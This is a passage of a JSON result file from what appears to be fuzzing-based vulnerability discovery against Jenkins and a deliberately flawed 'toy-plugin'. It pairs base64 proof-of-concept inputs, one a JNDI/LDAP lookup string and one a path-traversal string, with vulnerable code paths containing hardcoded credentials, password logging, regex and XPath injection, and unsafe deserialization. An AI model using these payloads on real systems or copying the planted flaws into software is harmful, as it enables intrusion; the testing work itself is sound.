{\n562                   return FormValidation.error(\"Invalid value for parameter [port]\");\n563               }\n564   \n565               String noProxyHost = null;\n566               if (request.hasParameter(\"noproxyhost\")) {\n567                   noProxyHost = request.getParameter(\"noproxyhost\");\n568               }\n569   \n570               String userName = null;\n571               if (request.hasParameter(\"username\")) {\n572                   userName = request.getParameter(\"username\");\n573               }\n574   \n575               Secret password = null;\n576   \n577               if (Util.fixEmptyAndTrim(name) != null &&\n578                   !isNoProxyHost(uri.getHost(), noProxyHost)) {\n579                   builder.proxy(ProxySelector.of(new InetSocketAddress(name, port)));\n580                   Authenticator authenticator = newValidationAuthenticator(userName, password != null ? password.getPlainText() : null);\n581                   builder.authenticator(authenticator);\n582               }\n583               HttpClient httpClient = builder.build();\n584               HttpRequest httpRequest;\n585               try {\n586                   httpRequest = ProxyConfiguration.newHttpRequestBuilder(uri)\n587                           .method(\"HEAD\", HttpRequest.BodyPublishers.noBody())\n588                           .build();\n589               } catch (IllegalArgumentException e) {\n590                   return FormValidation.error(e, Messages.ProxyConfiguration_MalformedTestUrl(testUrl));\n591               }\n592               try {\n593                   HttpResponse<Void> httpResponse = httpClient.send(httpRequest, HttpResponse.BodyHandlers.discarding());\n594                   if (httpResponse.statusCode() == HttpURLConnection.HTTP_OK) {\n595                       return FormValidation.ok(Messages.ProxyConfiguration_Success());\n596                   }\n597                   return FormValidation.error(Messages.ProxyConfiguration_FailedToConnect(testUrl, httpResponse.statusCode()));\n598               } catch (IOException e) {\n599                   return FormValidation.error(e, Messages.ProxyConfiguration_FailedToConnectViaProxy(testUrl));\n600               }\n601           }\n603           private boolean isNoProxyHost(String host, String noProxyHost) {\n604               if (host != null && noProxyHost != null) {\n605                   for (Pattern p : getNoProxyHostPatterns(noProxyHost)) {\n606                       if (p.matcher(host).matches()) {\n607                           return true;\n608                       }\n609                   }\n610               }\n611               return false;\n612           }\n",
            "cost": 0.5025599999999999,
            "harness_id": "id_3",
            "sanitizer": "Regular Expression Injection",
            "sink": "src/jenkins/core/src/main/java/hudson/ProxyConfiguration.java:228:35",
            "status": "corpus",
            "valid_path": "YES",
            "id": 23
        },
        {
            "blob": [
                "AAAASXdyYXBwZXIAKgB0ZXN0VHJlZQ=="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n252       void testApi(ByteBuffer buf) {\n253           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n254           if (parts.length != 3) {\n255               return;\n256           }\n257   \n258           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n259           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n260           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n261           try {\n262               new Api(jenkins).doXml(req, rsp, parts[2], null, null, 0);\n263           } catch (IOException | ServletException e) {}\n264       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/Api.java:\n100       public void doXml(StaplerRequest req, StaplerResponse rsp,\n101                         @QueryParameter String xpath,\n102                         @QueryParameter String wrapper,\n103                         @QueryParameter String tree,\n104                         @QueryParameter int depth) throws IOException, ServletException {\n105           setHeaders(rsp);\n106   \n107           String[] excludes = req.getParameterValues(\"exclude\");\n108   \n109           if (xpath == null && excludes == null) {\n110               // serve the whole thing\n111               rsp.serveExposedBean(req, bean, Flavor.XML);\n112               return;\n113           }\n114   \n115           StringWriter sw = new StringWriter();\n116   \n117           // first write to String\n118           Model p = MODEL_BUILDER.get(bean.getClass());\n119           TreePruner pruner = tree != null ? new NamedPathPruner(tree) : new ByDepth(1 - depth);\n120           p.writeTo(bean, pruner, Flavor.XML.createDataWriter(bean, sw));\n121   \n122           // apply XPath\n123           Object result;\n124           try {\n125               Document dom = XMLUtils.parse(new StringReader(sw.toString()));\n126               // apply exclusions\n127               if (excludes != null) {\n128                   for (String exclude : excludes) {\n129                       XMLUtils.getValue(exclude, dom);\n130                   }\n131               }\n132   \n133               if (xpath == null) {\n134                   result = dom;\n135               } else {\n136                   List<String> list = new ArrayList<String>();\n137                   list.add(XMLUtils.getValue(xpath, dom));\n138                   if (wrapper != null) {\n139                       // check if the wrapper is a valid entity name\n140                       // First position:  letter or underscore\n141                       // Other positions: \\w (letter, number, underscore), dash or dot\n142                       String validNameRE = \"^[a-zA-Z_][\\\\w-\\\\.]*$\";\n143   \n144                       if (!wrapper.matches(validNameRE)) {\n145                           rsp.setStatus(HttpServletResponse.SC_BAD_REQUEST);\n146                           rsp.getWriter().print(\"Messages.Api_WrapperParamInvalid()\");\n147                           return;\n148                       }\n149   \n150                       Element root = DocumentFactory.getInstance().createElement(wrapper);\n151                       for (Object o : list) {\n152                           if (o instanceof String) {\n153                               root.addText(o.toString());\n154                           } else {\n155                               root.add(((org.dom4j.Node) o).detach());\n156                           }\n157                       }\n158                       result = root;\n159                   } else if (list.isEmpty()) {\n160                       rsp.setStatus(HttpServletResponse.SC_NOT_FOUND);\n161                       rsp.getWriter().print(\"Messages.Api_NoXPathMatch(xpath)\");\n162                       return;\n163                   } else if (list.size() > 1) {\n164                       rsp.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n165                       rsp.getWriter().print(\"Messages.Api_MultipleMatch(xpath, list.size())\");\n166                       return;\n167                   } else {\n168                       result = list.get(0);\n169                   }\n170               }\n171   \n172           } catch (IOException | SAXException | XPathExpressionException e) {\n173               LOGGER.log(Level.FINER, \"Failed to do XPath/wrapper handling. XML is as follows:\" + sw, e);\n174               throw new IOException(\"Failed to do XPath/wrapper handling. Turn on FINER logging to view XML.\", e);\n175           }\n176   \n177   \n178           if (isSimpleOutput(result) && !permit(req)) {\n179               // simple output prohibited\n180               rsp.sendError(HttpURLConnection.HTTP_FORBIDDEN, \"primitive XPath result sets forbidden; implement jenkins.security.SecureRequester\");\n181               return;\n182           }\n183   \n184           // switch to gzipped output\n185           try (OutputStream o = rsp.getCompressedOutputStream(req)) {\n186               if (isSimpleOutput(result)) {\n187                   // simple output allowed\n188                   rsp.setContentType(\"text/plain;charset=UTF-8\");\n189                   String text = result instanceof CharacterData ? ((CharacterData) result).getText() : result.toString();\n190                   o.write(text.getBytes(StandardCharsets.UTF_8));\n191                   return;\n192               }\n193   \n194               // otherwise XML\n195               rsp.setContentType(\"application/xml;charset=UTF-8\");\n196               new XMLWriter(o).write(result);\n197           }\n198       }\n",
            "cost": 0.47236,
            "harness_id": "id_3",
            "sanitizer": "Regular Expression Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/Api.java:144:42",
            "status": "corpus",
            "valid_path": "YES",
            "id": 24
        },
        {
            "blob": [
                "AAAAkGNvdmVyYWdlL2phenplci10cmF2ZXJzYWwAYldGc2FXTnBiM1Z6WDJOdmJuUmxiblE9"
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n149       void testRecoverCoverage(ByteBuffer buf) throws Exception {\n150           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n151           if (parts.length != 2)\n152               return;\n153   \n154           String reportName = parts[0];\n155           if (reportName.contains(\"..\")) {\n156               return;\n157           }\n158   \n159           String serializedObject = parts[1];\n160           if (!reportName.startsWith(\"coverage\")) {\n161               return;\n162           }\n163   \n164           byte[] target = null;\n165           try {\n166               target = java.util.Base64.getDecoder().decode(serializedObject);\n167           } catch (IllegalArgumentException e) {\n168               return;\n169           }\n170   \n171           FreeStyleBuild build = Mockito.mock(FreeStyleBuild.class);\n172           File tmpDir = Files.createTempDirectory(\"testRecoverCoverage\").toFile();\n173           try {\n174               File reportFile = new File(tmpDir, reportName);\n175               try (FileOutputStream fos = new FileOutputStream(reportFile)) {\n176                   fos.write(target);\n177               } catch (IOException e) {\n178                   return;\n179               }\n180               when(build.getRootDir()).thenReturn(tmpDir);\n181               CoverageProcessor.recoverCoverageResult(build);\n182           } finally {\n183               try {\n184                   if (tmpDir.exists()) {\n185                       FileUtils.deleteDirectory(tmpDir);\n186                   }\n187               } catch (IOException e) {}\n188           }\n189       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/CoverageProcessor.java:\n729       public static CoverageResult recoverCoverageResult(final Run<?, ?> run) throws IOException, ClassNotFoundException {\n730           File reportFile = new File(run.getRootDir(), DEFAULT_REPORT_SAVE_NAME);\n731   \n732           try (ObjectInputStream ois = new CompatibleObjectInputStream(new BufferedInputStream(new FileInputStream(reportFile)))) {\n733               return (CoverageResult) ois.readObject();\n734           }\n735       }\n",
            "cost": 0.388985,
            "harness_id": "id_3",
            "sanitizer": "File read/write hook path",
            "sink": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/CoverageProcessor.java:732:114",
            "status": "corpus",
            "valid_path": "YES",
            "id": 25
        },
        {
            "blob": [
                "AAAAJm5hbWUAYWRtaW4AcGFzc3dvcmQAJHtqbmRpOmxkYXA6Ly9nLmNvL30="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 60       public static void fuzzerInitialize() throws Throwable {\n 61           jenkins = Mockito.mock(Jenkins.class);\n 62   \n 63           replacer = new StaplerReplacer();\n 64           replacer.setWebApp(new WebApp(Mockito.mock(ServletContext.class)));\n 65   \n 66           rsp = Mockito.mock(ResponseImpl.class);\n 67           StringWriter sw = new StringWriter();\n 68           PrintWriter pw = new PrintWriter(sw);\n 69           when(rsp.getWriter()).thenReturn(pw);\n 70   \n 71           secretMessage = new SecretMessage();\n 72           manager = PluginManager.createDefault(jenkins);\n 73       }\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n206       void testStateMonitor(ByteBuffer buf) {\n207           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n208           if (parts.length != 4) {\n209               return;\n210           }\n211   \n212           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n213           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n214           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n215           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n216           try {\n217               new StateMonitor().doCheck(req, rsp);\n218           } catch (Exception e) {\n219           }\n220       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java:\n35       @RequirePOST\n36       public void doCheck(StaplerRequest request, StaplerResponse response) throws Exception {\n37           if (!request.hasParameter(\"name\") || !request.hasParameter(\"password\")) {\n38               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n39               return;\n40           }\n41   \n42           String name = request.getParameter(\"name\");\n43           String password = request.getParameter(\"password\");\n44           String pattern = \"^[a-zA-Z]+$\";\n45           if (!name.matches(pattern) &&\n46                   !password.matches(pattern)) {\n47               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n48               return;\n49           }\n50   \n51           if (name.equals(\"admin\")) {\n52               if (password.equals(\"nimda\")) {\n53                   response.setContentType(\"application/json\");\n54                   response.setCharacterEncoding(\"UTF-8\");\n55                   response.getWriter().write(\"{\\\"status\\\": \\\"\" + state + \"\\\"}\");\n56                   return;\n57               } else {\n58                   logger.error(password);\n59                   response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n60                   return;\n61               }\n62           } else {\n63               logger.error(\"There are failed attempt.\");\n64               response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n65               return;\n66           }\n67       }\n",
            "cost": 0.38533,
            "harness_id": "id_3",
            "sanitizer": "Remote JNDI Lookup",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java:58:30",
            "status": "corpus",
            "valid_path": "YES",
            "id": 26
        },
        {
            "blob": [
                "AAAASXBhcmFtAHZhbHVlAGRvY3VtZW50KDIp"
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n252       void testApi(ByteBuffer buf) {\n253           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n254           if (parts.length != 3) {\n255               return;\n256           }\n257   \n258           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n259           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n260           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n261           try {\n262               new Api(jenkins).doXml(req, rsp, parts[2], null, null, 0);\n263           } catch (IOException | ServletException e) {}\n264       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/Api.java:\n100       public void doXml(StaplerRequest req, StaplerResponse rsp,\n101                         @QueryParameter String xpath,\n102                         @QueryParameter String wrapper,\n103                         @QueryParameter String tree,\n104                         @QueryParameter int depth) throws IOException, ServletException {\n105           setHeaders(rsp);\n106   \n107           String[] excludes = req.getParameterValues(\"exclude\");\n108   \n109           if (xpath == null && excludes == null) {\n110               // serve the whole thing\n111               rsp.serveExposedBean(req, bean, Flavor.XML);\n112               return;\n113           }\n114   \n115           StringWriter sw = new StringWriter();\n116   \n117           // first write to String\n118           Model p = MODEL_BUILDER.get(bean.getClass());\n119           TreePruner pruner = tree != null ? new NamedPathPruner(tree) : new ByDepth(1 - depth);\n120           p.writeTo(bean, pruner, Flavor.XML.createDataWriter(bean, sw));\n121   \n122           // apply XPath\n123           Object result;\n124           try {\n125               Document dom = XMLUtils.parse(new StringReader(sw.toString()));\n126               // apply exclusions\n127               if (excludes != null) {\n128                   for (String exclude : excludes) {\n129                       XMLUtils.getValue(exclude, dom);\n130                   }\n131               }\n132   \n133               if (xpath == null) {\n134                   result = dom;\n135               } else {\n136                   List<String> list = new ArrayList<String>();\n137                   list.add(XMLUtils.getValue(xpath, dom));\n138                   if (wrapper != null) {\n139                       // check if the wrapper is a valid entity name\n140                       // First position:  letter or underscore\n141                       // Other positions: \\w (letter, number, underscore), dash or dot\n142                       String validNameRE = \"^[a-zA-Z_][\\\\w-\\\\.]*$\";\n143   \n144                       if (!wrapper.matches(validNameRE)) {\n145                           rsp.setStatus(HttpServletResponse.SC_BAD_REQUEST);\n146                           rsp.getWriter().print(\"Messages.Api_WrapperParamInvalid()\");\n147                           return;\n148                       }\n149   \n150                       Element root = DocumentFactory.getInstance().createElement(wrapper);\n151                       for (Object o : list) {\n152                           if (o instanceof String) {\n153                               root.addText(o.toString());\n154                           } else {\n155                               root.add(((org.dom4j.Node) o).detach());\n156                           }\n157                       }\n158                       result = root;\n159                   } else if (list.isEmpty()) {\n160                       rsp.setStatus(HttpServletResponse.SC_NOT_FOUND);\n161                       rsp.getWriter().print(\"Messages.Api_NoXPathMatch(xpath)\");\n162                       return;\n163                   } else if (list.size() > 1) {\n164                       rsp.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n165                       rsp.getWriter().print(\"Messages.Api_MultipleMatch(xpath, list.size())\");\n166                       return;\n167                   } else {\n168                       result = list.get(0);\n169                   }\n170               }\n171   \n172           } catch (IOException | SAXException | XPathExpressionException e) {\n173               LOGGER.log(Level.FINER, \"Failed to do XPath/wrapper handling. XML is as follows:\" + sw, e);\n174               throw new IOException(\"Failed to do XPath/wrapper handling. Turn on FINER logging to view XML.\", e);\n175           }\n176   \n177   \n178           if (isSimpleOutput(result) && !permit(req)) {\n179               // simple output prohibited\n180               rsp.sendError(HttpURLConnection.HTTP_FORBIDDEN, \"primitive XPath result sets forbidden; implement jenkins.security.SecureRequester\");\n181               return;\n182           }\n183   \n184           // switch to gzipped output\n185           try (OutputStream o = rsp.getCompressedOutputStream(req)) {\n186               if (isSimpleOutput(result)) {\n187                   // simple output allowed\n188                   rsp.setContentType(\"text/plain;charset=UTF-8\");\n189                   String text = result instanceof CharacterData ? ((CharacterData) result).getText() : result.toString();\n190                   o.write(text.getBytes(StandardCharsets.UTF_8));\n191                   return;\n192               }\n193   \n194               // otherwise XML\n195               rsp.setContentType(\"application/xml;charset=UTF-8\");\n196               new XMLWriter(o).write(result);\n197           }\n198       }\n\nsrc/jenkins/core/src/main/java/jenkins/util/xml/XMLUtils.java:\n234       public static String getValue(String xpath, Document document) throws XPathExpressionException {\n235           XPath xPathProcessor = XPathFactory.newInstance().newXPath();\n236           return xPathProcessor.compile(xpath).evaluate(document);\n237       }\n",
            "cost": 0.43486499999999995,
            "harness_id": "id_3",
            "sanitizer": "XPath Injection",
            "sink": "src/jenkins/core/src/main/java/jenkins/util/xml/XMLUtils.java:236:39",
            "status": "corpus",
            "valid_path": "YES",
            "id": 27
        },
        {
            "blob": [
                "AAAAIQEBAgAIdXBsb2FkSWQABDEyMzQACnVwbG9hZFBhdGgAFi4uLy4uL2phenplci10cmF2ZXJzYWwAAA=="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n313       void testPlugin(ByteBuffer buf) {\n314           System.setProperty(\"jazzer.fs_allowed_dirs\", \"/tmp/,\" + System.getProperty(\"java.io.tmpdir\"));\n315           byte[] bytes = new byte[buf.remaining()];\n316           buf.get(bytes);\n317           DataInputStream data = new DataInputStream(new ByteArrayInputStream(bytes));\n318           try {\n319               int numRequests = data.readByte() % 10;\n320   \n321               for (int i = 0; i < numRequests; i++) {\n322                   int method = data.readByte() % 2;\n323                   HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n324                   int numParams = data.readByte() % 10;\n325                   for (int j = 0; j < numParams; j++) {\n326                       String paramName = data.readUTF();\n327                       String value = data.readUTF();\n328                       when(innerReq.getParameter(paramName)).thenReturn(value);\n329                   }\n330   \n331                   boolean setContentType = data.readBoolean();\n332                   if (setContentType) {\n333                       String contentType = data.readUTF();\n334                       when(innerReq.getContentType()).thenReturn(contentType);\n335                   }\n336   \n337                   if (data.readBoolean()) {\n338                       int bodyLength = data.readUnsignedShort();\n339                       byte[] body = new byte[bodyLength];\n340                       data.readFully(body);\n341                       ByteArrayInputStream byteStream = new ByteArrayInputStream(body);\n342                       when(innerReq.getInputStream()).thenAnswer(input -> {\n343                           return new DelegatingServletInputStream(byteStream);\n344                       });\n345                       when(innerReq.getContentLength()).thenReturn(bodyLength);\n346                   }\n347   \n348                   RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n349                   if (method == 0) {\n350                       HttpResponse res = manager.doCreateNewUpload(req);\n351                   } else if (method == 1) {\n352                       HttpResponse res = manager.doPerformUpload(req);\n353                   }\n354               }\n355           } catch (Exception e) {}\n356       }\n\nsrc/jenkins/core/src/main/java/hudson/PluginManager.java:\n1614       @RequirePOST\n1615       public HttpResponse doPerformUpload(StaplerRequest req) throws IOException, ServletException {\n1616           try {\n1617               File tmpDir = Files.createTempDirectory(\"uploadDir\").toFile();\n1618               ServletFileUpload upload = new ServletFileUpload(new DiskFileItemFactory(DiskFileItemFactory.DEFAULT_SIZE_THRESHOLD, tmpDir));\n1619               List<FileItem> items = upload.parseRequest(req);\n1620   \n1621               if (!req.hasParameter(\"uploadId\")) {\n1622                   return hudson.util.HttpResponses.errorJSON(\"No upload id specified\");\n1623               }\n1624   \n1625               int reqUploadId;\n1626               try {\n1627                   reqUploadId = Integer.parseInt(req.getParameter(\"uploadId\"));\n1628               } catch (NumberFormatException e) {\n1629                   return hudson.util.HttpResponses.errorJSON(e.getMessage());\n1630               }\n1631               if (this.uploadId != reqUploadId) {\n1632                   return hudson.util.HttpResponses.errorJSON(\"Wrong upload id\");\n1633               }\n1634   \n1635               FileItem fileItem = items.get(0);\n1636               File uploadDir = new File(\"/tmp/plugins\");\n1637               uploadDir.mkdirs();\n1638               File uploadedFile = new File(uploadDir, req.getParameter(\"uploadPath\"));\n1639   \n1640               FileOutputStream fos = new FileOutputStream(uploadedFile);\n1641               fos.write(fileItem.get());\n1642   \n1643               JSONObject response = new JSONObject();\n1644               response.put(\"uploaded\", true);\n1645               response.put(\"path\", uploadedFile.getAbsolutePath());\n1646               return hudson.util.HttpResponses.okJSON(response);\n1647           } catch (Exception e) {\n1648               throw new ServletException(e);\n1649           }\n1650       }\n",
            "cost": 0.484605,
            "harness_id": "id_3",
            "sanitizer": "File read/write hook path",
            "sink": "src/jenkins/core/src/main/java/hudson/PluginManager.java:1640:57",
            "status": "corpus",
            "valid_path": "YES",
            "id": 28
        },
        {
            "blob": [
                "AAAATWlwAC4qAHNraXAAdHJ1ZQ=="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n285       void testAccessFilter(ByteBuffer buf) {\n286           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n287           if (parts.length != 4) {\n288               return;\n289           }\n290   \n291           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n292           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n293           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n294           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n295           when(jenkins.hasPermission(Jenkins.ADMINISTER)).thenReturn(false);\n296           AccessFilter accessFilter = new AccessFilter();\n297           accessFilter.setJenkins(jenkins);\n298           try {\n299               accessFilter.doGet(req, rsp);\n300           } catch (IOException e) {}\n301       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AccessFilter.java:\n 70       @RequirePOST\n 71       public void doGet(StaplerRequest request, StaplerResponse response) throws IOException {\n 72           if (!request.hasParameter(\"ip\")) {\n 73               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n 74               return;\n 75           }\n 76           String ip = request.getParameter(\"ip\");\n 77           boolean skip = false;\n 78           boolean admin = getJenkins().hasPermission(Jenkins.ADMINISTER);\n 79           if (admin || request.hasParameter(\"skip\")) {\n 80               skip = Boolean.parseBoolean(request.getParameter(\"skip\"));\n 81           }\n 82           if (!isValidIPFormat(ip) && !skip) {\n 83               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n 84               return;\n 85           }\n 86   \n 87           Pattern pattern = Pattern.compile(\".*(\" + ip + \").*\");\n 88           List<String> result = new ArrayList<>();\n 89           for (String data : access) {\n 90               if (!pattern.matcher(data).matches()) {\n 91                   continue;\n 92               }\n 93               result.add(data);\n 94           }\n 95           Gson gson = new Gson();\n 96           response.getWriter().write(gson.toJson(result));\n 97       }\n",
            "cost": 0.3848849999999999,
            "harness_id": "id_3",
            "sanitizer": "Regular Expression Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AccessFilter.java:87:43",
            "status": "corpus",
            "valid_path": "YES",
            "id": 29
        },
        {
            "blob": [
